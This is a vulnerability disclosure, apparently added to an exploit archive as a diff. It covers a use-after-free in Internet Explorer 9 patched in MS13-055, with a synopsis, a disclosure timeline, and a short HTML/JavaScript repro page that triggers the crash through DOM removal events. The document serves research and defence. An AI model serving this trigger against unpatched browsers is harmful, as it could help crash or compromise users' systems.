@@ -1,0 +1,50 @@
+<!--
+
+Source: http://blog.skylined.nl/20161214001.html
+
+Synopsis
+
+A specially crafted web-page can trigger a use-after-free vulnerability in Microsoft Internet Explorer 9. I did not investigate this vulnerability thoroughly, so I cannot speculate on the potential impact or exploitability.
+
+Known affected software and attack vectors
+
+Microsoft Internet Explorer 9
+
+An attacker would need to get a target user to open a specially crafted web-page. Disabling Java­Script should prevent an attacker from triggering the vulnerable code path.
+Details
+This bug was found back when I had very little knowledge and tools to do analysis on use-after-free bugs, so I have no details to share. ZDI revealed that this was a use-after-free vulnerability, though their advisory mentions an iframe, which is not in the repro I provided. I have included a number of reports created using a predecessor of Bug­Id below.
+
+Repro.html:
+-->
+
+<!DOCTYPE html>
+<html>
+  <script>
+    document.add­Event­Listener("load", function (){
+      document.document­Element.remove­Node(true);
+    }, true);
+    document.add­Event­Listener("DOMNode­Removed", function (){
+      document.write("");
+    }, true);
+  </script>
+  <style>
+  </style>
+  <span dir="rtl">
+    <ruby dir="ltr">
+      <br/>
+    </ruby>
+  </span>
+</html>
+
+<!--
+Time-line
+
+Sometime in November 2012: This vulnerability was found through fuzzing.
+11 November 2012: This vulnerability was submitted to EIP.
+10 December 2012: This vulnerability was rejected by EIP.
+12 December 2012: This vulnerability was submitted to ZDI.
+25 January 2013: This vulnerability was acquired by ZDI.
+15 February 2013: This vulnerability was disclosed to Microsoft by ZDI.
+26 July 2013: This vulnerability was address by Microsoft in MS13-055.
+14 December 2016: Details of this vulnerability are released.
+-->
